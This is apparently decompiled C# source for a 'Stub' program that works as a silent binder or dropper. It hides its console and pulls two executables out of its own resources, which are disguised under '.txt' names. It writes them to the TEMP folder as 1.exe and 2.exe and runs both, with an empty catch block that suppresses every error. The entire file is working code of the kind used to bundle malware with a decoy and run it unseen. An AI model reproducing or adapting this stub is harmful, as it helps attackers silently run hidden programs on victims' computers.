using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Stub;

internal class Program
{
	public static FileStream F1Stream;

	public static FileStream F2Stream;

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	private static void Main(string[] args)
	{
		try
		{
			FreeConsole();
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("1.txt");
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			manifestResourceStream.Close();
			Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("2.txt");
			byte[] array2 = new byte[manifestResourceStream2.Length];
			manifestResourceStream2.Read(array2, 0, array2.Length);
			F1Stream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\1.exe", FileMode.Create);
			F1Stream.Write(array, 0, array.Length);
			F1Stream.Close();
			F1Stream.Dispose();
			F2Stream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\2.exe", FileMode.Create);
			F2Stream.Write(array2, 0, array2.Length);
			F2Stream.Close();
			F2Stream.Dispose();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\1.exe";
			process.Start();
			Process process2 = new Process();
			process2.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\2.exe";
			process2.Start();
		}
		catch
		{
		}
	}
}
